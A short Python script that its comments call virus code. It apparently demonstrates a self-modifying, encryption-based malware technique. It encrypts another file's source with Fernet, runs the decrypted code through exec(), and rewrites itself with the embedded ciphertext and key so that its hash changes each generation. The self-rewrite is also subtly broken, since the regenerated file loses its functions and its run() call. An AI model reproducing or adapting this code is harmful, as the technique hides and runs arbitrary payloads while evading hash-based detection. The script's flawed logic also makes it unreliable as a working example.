import inspect
import os
from cryptography.fernet import Fernet
import hashlib

# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
    h = hashlib.sha1()
    with open(filename, 'rb') as file:
        chunk = 0
        while chunk != b'':
            chunk = file.read(1024)
            h.update(chunk)

    return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# End of Hash Code
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    decrypted_code = fer.decrypt(token).decode()  # Decrypt the content
    exec(decrypted_code)  # Execute the decrypted code


def encrypt_file_content(filename, key):
    with open(filename, 'r') as f:
        file_content = f.read()
    fer = Fernet(key)
    encrypted_content = fer.encrypt(file_content.encode())
    return encrypted_content


# START
key = Fernet.generate_key() 
sql_token = encrypt_file_content('example.py', key)

def run():
    fname = os.path.basename(__file__)
    lines = []
    with open(fname, 'r') as f:
        lines = f.readlines()
    
    with open('lol', 'w') as f:
        for line in lines:
            if line.startswith("# START"):
                break
            f.write(line)

        f.write("# START\n")
        
        f.write("sql_token = \"{}\"\n".format(sql_token.decode()))
        f.write("key = \"{}\"\n".format(key.decode()))
        decrypt(sql_token, key)  
    
    os.remove(fname)
    os.rename("lol", fname)

run()
